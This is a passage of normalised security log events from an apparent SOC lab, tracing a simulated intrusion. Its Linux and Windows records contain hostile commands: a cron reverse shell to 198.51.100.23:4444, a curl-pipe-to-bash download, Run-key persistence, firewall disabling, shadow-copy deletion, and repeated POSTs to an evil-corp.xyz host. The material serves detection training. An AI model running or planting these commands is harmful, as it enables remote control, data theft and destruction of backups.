  {
    "source": "dns",
    "raw": "17-Feb-2026 10:12:00.000 queries: info: client @0x6ab4 10.0.1.51#47746 (slack.com): query: slack.com IN CNAME + (10.0.0.2)",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/dns_queries.log",
    "line_number": 22,
    "event_type": "dns_query",
    "severity": "LOW",
    "details": {
      "query_domain": "slack.com",
      "query_type": "CNAME",
      "source_ip": "10.0.1.51",
      "action": "dns_lookup"
    },
    "timestamp": "2026-02-17T10:12:00",
    "event_id": "EVT-000681"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T10:12:00 4383 10.0.1.50 TCP_200/200 170 POST https://cdn-update.evil-corp.xyz/api/sync - DIRECT/198.51.100.23 python-requests/2.31.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 17,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T10:12:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "POST",
      "url": "https://cdn-update.evil-corp.xyz/api/sync",
      "bytes": 170,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000682"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T10:12:00 666 10.0.1.50 TCP_200/200 430 POST https://cdn-update.evil-corp.xyz/api/backup - DIRECT/198.51.100.23 python-requests/2.31.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 18,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T10:12:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "POST",
      "url": "https://cdn-update.evil-corp.xyz/api/backup",
      "bytes": 430,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000683"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T10:13:00 251 10.0.1.50 TCP_200/200 311 POST https://cdn-update.evil-corp.xyz/api/upload - DIRECT/198.51.100.23 python-requests/2.31.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 19,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T10:13:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "POST",
      "url": "https://cdn-update.evil-corp.xyz/api/upload",
      "bytes": 311,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000684"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T10:21:00 4641 10.0.1.50 TCP_200/200 305 POST https://cdn-update.evil-corp.xyz/api/sync - DIRECT/198.51.100.23 python-requests/2.31.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 20,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T10:21:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "POST",
      "url": "https://cdn-update.evil-corp.xyz/api/sync",
      "bytes": 305,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000685"
  },
  {
    "source": "aws_s3",
    "timestamp": "2026-02-17T10:27:00",
    "raw": "{\"eventVersion\": \"1.08\", \"eventSource\": \"s3.amazonaws.com\", \"eventName\": \"GetObject\", \"eventTime\": \"2026-02-17T10:27:00Z\", \"sourceIPAddress\": \"10.0.1.50\", \"userAgent\": \"aws-cli/2.15.0\", \"requestParameters\": {\"bucketName\": \"corpsec-prod-data\", \"key\": \"app/config/settings_5.json\"}, \"responseElements\": null, \"additionalEventData\": {\"bytesTransferredOut\": 15909}}",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/cloud/s3_access_events.json",
    "event_type": "s3_access",
    "severity": "LOW",
    "details": {
      "event_name": "GetObject",
      "source_ip": "10.0.1.50",
      "user_name": "unknown",
      "bucket_name": "corpsec-prod-data",
      "key": "app/config/settings_5.json",
      "bytes_transferred": 15909,
      "action": "GetObject"
    },
    "event_id": "EVT-000686"
  },
  {
    "source": "linux_auth",
    "raw": "Feb 17 10:30:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/linux/auth.log",
    "line_number": 468,
    "timestamp": "2026-02-17T10:30:00",
    "event_type": "privilege_escalation",
    "severity": "MEDIUM",
    "details": {
      "username": "deploy",
      "command": "/usr/bin/tail -f /var/log/syslog",
      "action": "sudo_executed",
      "unauthorized": false
    },
    "event_id": "EVT-000687"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T10:30:00 212 10.0.1.50 TCP_200/200 201 POST http://198.51.100.23/data - DIRECT/198.51.100.23 python-requests/2.31.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 21,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T10:30:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "POST",
      "url": "http://198.51.100.23/data",
      "bytes": 201,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000688"
  },
  {
    "source": "windows_security",
    "timestamp": "2026-02-17T10:35:00",
    "raw": "{\"EventID\": 4688, \"TimeCreated\": \"2026-02-17T10:35:00Z\", \"Computer\": \"WS-FIN-PC04.corpsec.local\", \"Channel\": \"Security\", \"Provider\": \"Microsoft-Windows-Security-Auditing\", \"Level\": \"Information\", \"Task\": \"Process Creation\", \"Keywords\": \"Audit Success\", \"EventData\": {\"SubjectUserSid\": \"S-1-5-21-123456789-5706\", \"SubjectUserName\": \"svc_backup\", \"SubjectDomainName\": \"CORPSEC\", \"NewProcessId\": \"0x9441\", \"NewProcessName\": \"C:\\\\Windows\\\\System32\\\\powershell.exe\", \"CommandLine\": \"powershell.exe -c \\\"reg add HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Updater /t REG_SZ /d C:\\\\Windows\\\\Temp\\\\svc.exe\\\"\", \"ParentProcessName\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"TokenElevationType\": \"%%1937\", \"MandatoryLabel\": \"S-1-16-8192\"}}",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/windows/security_events.json",
    "event_type": "process_creation",
    "severity": "LOW",
    "details": {
      "username": "svc_backup",
      "command_line": "powershell.exe -c \"reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Windows\\Temp\\svc.exe\"",
      "process_name": "C:\\Windows\\System32\\powershell.exe",
      "parent_process": "C:\\Windows\\System32\\cmd.exe",
      "action": "process_created"
    },
    "event_id": "EVT-000689"
  },
  {
    "source": "windows_security",
    "timestamp": "2026-02-17T10:36:00",
    "raw": "{\"EventID\": 4688, \"TimeCreated\": \"2026-02-17T10:36:00Z\", \"Computer\": \"WS-FIN-PC04.corpsec.local\", \"Channel\": \"Security\", \"Provider\": \"Microsoft-Windows-Security-Auditing\", \"Level\": \"Information\", \"Task\": \"Process Creation\", \"Keywords\": \"Audit Success\", \"EventData\": {\"SubjectUserSid\": \"S-1-5-21-123456789-2824\", \"SubjectUserName\": \"svc_backup\", \"SubjectDomainName\": \"CORPSEC\", \"NewProcessId\": \"0xd5ca\", \"NewProcessName\": \"C:\\\\Windows\\\\System32\\\\powershell.exe\", \"CommandLine\": \"powershell.exe -c \\\"netsh advfirewall set allprofiles state off\\\"\", \"ParentProcessName\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"TokenElevationType\": \"%%1937\", \"MandatoryLabel\": \"S-1-16-8192\"}}",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/windows/security_events.json",
    "event_type": "process_creation",
    "severity": "LOW",
    "details": {
      "username": "svc_backup",
      "command_line": "powershell.exe -c \"netsh advfirewall set allprofiles state off\"",
      "process_name": "C:\\Windows\\System32\\powershell.exe",
      "parent_process": "C:\\Windows\\System32\\cmd.exe",
      "action": "process_created"
    },
    "event_id": "EVT-000690"
  },
  {
    "source": "dns",
    "raw": "17-Feb-2026 10:37:00.000 queries: info: client @0x1fa4 10.0.2.10#63542 (npmjs.org): query: npmjs.org IN CNAME + (10.0.0.2)",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/dns_queries.log",
    "line_number": 23,
    "event_type": "dns_query",
    "severity": "LOW",
    "details": {
      "query_domain": "npmjs.org",
      "query_type": "CNAME",
      "source_ip": "10.0.2.10",
      "action": "dns_lookup"
    },
    "timestamp": "2026-02-17T10:37:00",
    "event_id": "EVT-000691"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T10:40:00 785 10.0.1.50 TCP_200/200 112 POST https://cdn-update.evil-corp.xyz/api/upload - DIRECT/198.51.100.23 python-requests/2.31.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 22,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T10:40:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "POST",
      "url": "https://cdn-update.evil-corp.xyz/api/upload",
      "bytes": 112,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000692"
  },
  {
    "source": "windows_security",
    "timestamp": "2026-02-17T10:41:00",
    "raw": "{\"EventID\": 4688, \"TimeCreated\": \"2026-02-17T10:41:00Z\", \"Computer\": \"WS-FIN-PC04.corpsec.local\", \"Channel\": \"Security\", \"Provider\": \"Microsoft-Windows-Security-Auditing\", \"Level\": \"Information\", \"Task\": \"Process Creation\", \"Keywords\": \"Audit Success\", \"EventData\": {\"SubjectUserSid\": \"S-1-5-21-123456789-2249\", \"SubjectUserName\": \"jsmith\", \"SubjectDomainName\": \"CORPSEC\", \"NewProcessId\": \"0x1c58\", \"NewProcessName\": \"C:\\\\Windows\\\\System32\\\\powershell.exe\", \"CommandLine\": \"powershell.exe -c \\\"Get-EventLog -LogName System -Newest 10\\\"\", \"ParentProcessName\": \"C:\\\\Windows\\\\System32\\\\explorer.exe\", \"TokenElevationType\": \"%%1937\", \"MandatoryLabel\": \"S-1-16-8192\"}}",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/windows/security_events.json",
    "event_type": "process_creation",
    "severity": "LOW",
    "details": {
      "username": "jsmith",
      "command_line": "powershell.exe -c \"Get-EventLog -LogName System -Newest 10\"",
      "process_name": "C:\\Windows\\System32\\powershell.exe",
      "parent_process": "C:\\Windows\\System32\\explorer.exe",
      "action": "process_created"
    },
    "event_id": "EVT-000693"
  },
  {
    "source": "windows_security",
    "timestamp": "2026-02-17T10:42:00",
    "raw": "{\"EventID\": 4688, \"TimeCreated\": \"2026-02-17T10:42:00Z\", \"Computer\": \"WS-FIN-PC04.corpsec.local\", \"Channel\": \"Security\", \"Provider\": \"Microsoft-Windows-Security-Auditing\", \"Level\": \"Information\", \"Task\": \"Process Creation\", \"Keywords\": \"Audit Success\", \"EventData\": {\"SubjectUserSid\": \"S-1-5-21-123456789-3437\", \"SubjectUserName\": \"svc_backup\", \"SubjectDomainName\": \"CORPSEC\", \"NewProcessId\": \"0xd3a3\", \"NewProcessName\": \"C:\\\\Windows\\\\System32\\\\powershell.exe\", \"CommandLine\": \"powershell.exe -c \\\"wmic shadowcopy delete /nointeractive\\\"\", \"ParentProcessName\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"TokenElevationType\": \"%%1937\", \"MandatoryLabel\": \"S-1-16-8192\"}}",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/windows/security_events.json",
    "event_type": "process_creation",
    "severity": "LOW",
    "details": {
      "username": "svc_backup",
      "command_line": "powershell.exe -c \"wmic shadowcopy delete /nointeractive\"",
      "process_name": "C:\\Windows\\System32\\powershell.exe",
      "parent_process": "C:\\Windows\\System32\\cmd.exe",
      "action": "process_created"
    },
    "event_id": "EVT-000694"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T10:44:00 2114 10.0.1.50 TCP_200/200 125 POST https://cdn-update.evil-corp.xyz/api/backup - DIRECT/198.51.100.23 python-requests/2.31.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 23,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T10:44:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "POST",
      "url": "https://cdn-update.evil-corp.xyz/api/backup",
      "bytes": 125,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000695"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T10:45:00 954 10.0.1.50 TCP_200/200 209 POST http://198.51.100.23/data - DIRECT/198.51.100.23 python-requests/2.31.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 24,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T10:45:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "POST",
      "url": "http://198.51.100.23/data",
      "bytes": 209,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000696"
  },
  {
    "source": "linux_auth",
    "raw": "Feb 17 10:48:00 prod-web-01 sshd[28721]: Accepted password for deploy from 172.16.0.5 port 54518 ssh2",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/linux/auth.log",
    "line_number": 424,
    "timestamp": "2026-02-17T10:48:00",
    "event_type": "authentication_success",
    "severity": "INFO",
    "details": {
      "source_ip": "172.16.0.5",
      "username": "deploy",
      "service": "sshd",
      "action": "successful_login"
    },
    "event_id": "EVT-000697"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T10:48:00 1148 10.0.1.50 TCP_200/200 321 POST http://198.51.100.23/data - DIRECT/198.51.100.23 python-requests/2.31.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 25,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T10:48:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "POST",
      "url": "http://198.51.100.23/data",
      "bytes": 321,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000698"
  },
  {
    "source": "linux_auth",
    "raw": "Feb 17 10:48:01 prod-web-01 sshd[28721]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/linux/auth.log",
    "line_number": 425,
    "timestamp": "2026-02-17T10:48:01",
    "event_type": "other",
    "severity": "LOW",
    "details": {
      "message": "Feb 17 10:48:01 prod-web-01 sshd[28721]: pam_unix(sshd:session): session opened for user deploy(uid=1001) by (uid=0)"
    },
    "event_id": "EVT-000699"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T10:51:00 4871 10.0.1.50 TCP_200/200 287 POST https://cdn-update.evil-corp.xyz/api/upload - DIRECT/198.51.100.23 python-requests/2.31.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 26,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T10:51:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "POST",
      "url": "https://cdn-update.evil-corp.xyz/api/upload",
      "bytes": 287,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000700"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T10:56:00 942 10.0.1.50 TCP_200/200 439 POST https://cdn-update.evil-corp.xyz/api/sync - DIRECT/198.51.100.23 python-requests/2.31.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 27,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T10:56:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "POST",
      "url": "https://cdn-update.evil-corp.xyz/api/sync",
      "bytes": 439,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000701"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T10:56:00 2721 10.0.1.50 TCP_200/200 171 POST https://cdn-update.evil-corp.xyz/api/sync - DIRECT/198.51.100.23 python-requests/2.31.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 28,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T10:56:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "POST",
      "url": "https://cdn-update.evil-corp.xyz/api/sync",
      "bytes": 171,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000702"
  },
  {
    "source": "linux_auth",
    "raw": "Feb 17 11:00:00 prod-web-01 CRON[25128]: (root CMD (/usr/bin/certbot renew --quiet))",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/linux/auth.log",
    "line_number": 472,
    "timestamp": "2026-02-17T11:00:00",
    "event_type": "scheduled_task",
    "severity": "LOW",
    "details": {
      "action": "cron_execution",
      "command": "/usr/bin/certbot renew --quiet)"
    },
    "event_id": "EVT-000703"
  },
  {
    "source": "linux_auth",
    "raw": "Feb 17 11:00:00 prod-web-01 crontab[34640]: (deploy) REPLACE (deploy)",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/linux/auth.log",
    "line_number": 473,
    "timestamp": "2026-02-17T11:00:00",
    "event_type": "scheduled_task_modified",
    "severity": "MEDIUM",
    "details": {
      "action": "crontab_modified",
      "username": "deploy"
    },
    "event_id": "EVT-000704"
  },
  {
    "source": "linux_auth",
    "raw": "Feb 17 11:00:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tee /etc/systemd/system/system-update.service",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/linux/auth.log",
    "line_number": 474,
    "timestamp": "2026-02-17T11:00:00",
    "event_type": "privilege_escalation",
    "severity": "MEDIUM",
    "details": {
      "username": "deploy",
      "command": "/usr/bin/tee /etc/systemd/system/system-update.service",
      "action": "sudo_executed",
      "unauthorized": false
    },
    "event_id": "EVT-000705"
  },
  {
    "source": "dns",
    "raw": "17-Feb-2026 11:00:00.000 queries: info: client @0x8c42 10.0.2.10#58636 (amazonaws.com): query: amazonaws.com IN CNAME + (10.0.0.2)",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/dns_queries.log",
    "line_number": 24,
    "event_type": "dns_query",
    "severity": "LOW",
    "details": {
      "query_domain": "amazonaws.com",
      "query_type": "CNAME",
      "source_ip": "10.0.2.10",
      "action": "dns_lookup"
    },
    "timestamp": "2026-02-17T11:00:00",
    "event_id": "EVT-000706"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T11:00:00 1500 10.0.1.50 TCP_200/200 382 POST https://cdn-update.evil-corp.xyz/api/upload - DIRECT/198.51.100.23 python-requests/2.31.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 29,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T11:00:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "POST",
      "url": "https://cdn-update.evil-corp.xyz/api/upload",
      "bytes": 382,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000707"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T11:00:00 3706 10.0.1.50 TCP_200/200 264 POST https://cdn-update.evil-corp.xyz/api/sync - DIRECT/198.51.100.23 python-requests/2.31.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 30,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T11:00:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "POST",
      "url": "https://cdn-update.evil-corp.xyz/api/sync",
      "bytes": 264,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000708"
  },
  {
    "source": "linux_auth",
    "raw": "Feb 17 11:00:01 prod-web-01 CRON[36428]: (deploy) CMD (* * * * * /bin/bash -c 'bash -i >& /dev/tcp/198.51.100.23/4444 0>&1')",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/linux/auth.log",
    "line_number": 475,
    "timestamp": "2026-02-17T11:00:01",
    "event_type": "scheduled_task",
    "severity": "LOW",
    "details": {
      "action": "cron_execution",
      "command": "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/198.51.100.23/4444 0>&1'"
    },
    "event_id": "EVT-000709"
  },
  {
    "source": "linux_auth",
    "raw": "Feb 17 11:00:05 prod-web-01 systemd[1]: Created slice system-update.service.",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/linux/auth.log",
    "line_number": 476,
    "timestamp": "2026-02-17T11:00:05",
    "event_type": "service_activity",
    "severity": "LOW",
    "details": {
      "action": "systemd_activity",
      "message": "[1]: Created slice system-update.service."
    },
    "event_id": "EVT-000710"
  },
  {
    "source": "linux_auth",
    "raw": "Feb 17 11:00:06 prod-web-01 systemd[1]: Starting System Update Service...",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/linux/auth.log",
    "line_number": 477,
    "timestamp": "2026-02-17T11:00:06",
    "event_type": "service_activity",
    "severity": "LOW",
    "details": {
      "action": "systemd_activity",
      "message": "[1]: Starting System Update Service..."
    },
    "event_id": "EVT-000711"
  },
  {
    "source": "linux_auth",
    "raw": "Feb 17 11:00:07 prod-web-01 systemd[1]: Started System Update Service.",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/linux/auth.log",
    "line_number": 478,
    "timestamp": "2026-02-17T11:00:07",
    "event_type": "service_activity",
    "severity": "LOW",
    "details": {
      "action": "systemd_activity",
      "message": "[1]: Started System Update Service."
    },
    "event_id": "EVT-000712"
  },
  {
    "source": "linux_auth",
    "raw": "Feb 17 11:00:10 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl enable system-update.service",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/linux/auth.log",
    "line_number": 479,
    "timestamp": "2026-02-17T11:00:10",
    "event_type": "privilege_escalation",
    "severity": "MEDIUM",
    "details": {
      "username": "deploy",
      "command": "/usr/bin/systemctl enable system-update.service",
      "action": "sudo_executed",
      "unauthorized": false
    },
    "event_id": "EVT-000713"
  },
  {
    "source": "linux_auth",
    "raw": "Feb 17 11:00:12 prod-web-01 systemd[1]: Reloading daemon configuration.",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/linux/auth.log",
    "line_number": 480,
    "timestamp": "2026-02-17T11:00:12",
    "event_type": "service_activity",
    "severity": "LOW",
    "details": {
      "action": "systemd_activity",
      "message": "[1]: Reloading daemon configuration."
    },
    "event_id": "EVT-000714"
  },
  {
    "source": "linux_auth",
    "raw": "Feb 17 11:00:15 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl start system-update.service",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/linux/auth.log",
    "line_number": 481,
    "timestamp": "2026-02-17T11:00:15",
    "event_type": "privilege_escalation",
    "severity": "MEDIUM",
    "details": {
      "username": "deploy",
      "command": "/usr/bin/systemctl start system-update.service",
      "action": "sudo_executed",
      "unauthorized": false
    },
    "event_id": "EVT-000715"
  },
  {
    "source": "linux_auth",
    "raw": "Feb 17 11:03:00 prod-web-01 crontab[22331]: (deploy) REPLACE (deploy)",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/linux/auth.log",
    "line_number": 482,
    "timestamp": "2026-02-17T11:03:00",
    "event_type": "scheduled_task_modified",
    "severity": "MEDIUM",
    "details": {
      "action": "crontab_modified",
      "username": "deploy"
    },
    "event_id": "EVT-000716"
  },
  {
    "source": "linux_auth",
    "raw": "Feb 17 11:03:01 prod-web-01 CRON[29721]: (deploy) CMD (*/5 * * * * /tmp/.hidden/beacon.sh)",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/linux/auth.log",
    "line_number": 483,
    "timestamp": "2026-02-17T11:03:01",
    "event_type": "scheduled_task",
    "severity": "LOW",
    "details": {
      "action": "cron_execution",
      "command": "*/5 * * * * /tmp/.hidden/beacon.sh"
    },
    "event_id": "EVT-000717"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T11:04:00 4976 10.0.1.50 TCP_200/200 42349 GET https://docs.python.org/3/library - DIRECT/13.107.42.14 Mozilla/5.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 31,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T11:04:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "GET",
      "url": "https://docs.python.org/3/library",
      "bytes": 42349,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000718"
  },
  {
    "source": "linux_auth",
    "raw": "Feb 17 11:06:00 prod-web-01 crontab[23784]: (root) REPLACE (root)",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/linux/auth.log",
    "line_number": 484,
    "timestamp": "2026-02-17T11:06:00",
    "event_type": "scheduled_task_modified",
    "severity": "MEDIUM",
    "details": {
      "action": "crontab_modified",
      "username": "root"
    },
    "event_id": "EVT-000719"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T11:06:00 2302 10.0.1.50 TCP_200/200 326 POST http://198.51.100.23/data - DIRECT/198.51.100.23 python-requests/2.31.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 32,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T11:06:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "POST",
      "url": "http://198.51.100.23/data",
      "bytes": 326,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000720"
  },
  {
    "source": "linux_auth",
    "raw": "Feb 17 11:06:01 prod-web-01 CRON[37704]: (root) CMD (0 */2 * * * curl -s http://198.51.100.23/update.sh | bash)",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/linux/auth.log",
    "line_number": 485,
    "timestamp": "2026-02-17T11:06:01",
    "event_type": "scheduled_task",
    "severity": "LOW",
    "details": {
      "action": "cron_execution",
      "command": "0 */2 * * * curl -s http://198.51.100.23/update.sh | bash"
    },
    "event_id": "EVT-000721"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T11:09:00 3626 10.0.1.50 TCP_200/200 146 POST https://cdn-update.evil-corp.xyz/api/upload - DIRECT/198.51.100.23 python-requests/2.31.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 33,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T11:09:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "POST",
      "url": "https://cdn-update.evil-corp.xyz/api/upload",
      "bytes": 146,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000722"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T11:15:00 1792 10.0.1.50 TCP_200/200 308 POST https://cdn-update.evil-corp.xyz/api/upload - DIRECT/198.51.100.23 python-requests/2.31.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 34,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T11:15:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "POST",
      "url": "https://cdn-update.evil-corp.xyz/api/upload",
      "bytes": 308,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000723"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T11:16:00 657 10.0.1.50 TCP_200/200 158 POST http://198.51.100.23/data - DIRECT/198.51.100.23 python-requests/2.31.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 35,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T11:16:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "POST",
      "url": "http://198.51.100.23/data",
      "bytes": 158,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000724"
  },
  {
    "source": "proxy",
    "raw": "2026-02-17T11:20:00 2532 10.0.1.50 TCP_200/200 471 POST https://cdn-update.evil-corp.xyz/api/upload - DIRECT/198.51.100.23 python-requests/2.31.0",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/network/proxy_access.log",
    "line_number": 36,
    "event_type": "web_request",
    "severity": "LOW",
    "timestamp": "2026-02-17T11:20:00",
    "details": {
      "source_ip": "10.0.1.50",
      "method": "POST",
      "url": "https://cdn-update.evil-corp.xyz/api/upload",
      "bytes": 471,
      "status": "200",
      "action": "web_access"
    },
    "event_id": "EVT-000725"
  },
  {
    "source": "linux_auth",
    "raw": "Feb 17 11:26:00 prod-web-01 sudo: deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog",
    "log_file": "/home/narenpindi/Desktop/project/enterprise-soc-lab/logs/linux/auth.log",
    "line_number": 469,
    "timestamp": "2026-02-17T11:26:00",
    "event_type": "privilege_escalation",
    "severity": "MEDIUM",
    "details": {
      "username": "deploy",
      "command": "/usr/bin/tail -f /var/log/syslog",
      "action": "sudo_executed",
      "unauthorized": false
    },
